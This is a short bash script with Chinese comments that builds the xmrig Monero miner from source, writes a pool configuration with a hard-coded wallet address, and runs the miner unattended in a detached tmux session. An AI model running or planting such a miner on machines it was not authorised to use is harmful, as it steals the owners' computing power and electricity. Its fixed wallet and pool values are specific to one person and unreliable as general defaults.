#!/bin/bash

# 安装所需的软件
sudo apt-get update
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# 克隆 xmrig 代码
git clone https://github.com/xmrig/xmrig.git

# 进入 xmrig 目录并构建
cd xmrig || exit 1
mkdir -p build && cd build || exit 1
cmake ..
make -j4

# 创建配置文件 config.json
cat << EOF > config.json
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": "monero",
            "algo": "rx/0",
            "url": "randomx.rplant.xyz:17107",
            "user": "N9t1nwHKhw4BRNwYrdK5EdFbU2NthQBL34zTrqQ3Zffzb9PxfMHBnPz1ys6sAypiNdXD5zQABY1dELn2cvAmDCPTStwmBnF",
            "pass": "1",
            "tls": false,
            "keepalive": true,
            "nicehash": false
        }
    ]
}
EOF

# 使用 tmux 运行 xmrig
tmux new -d -s xmrig './xmrig'
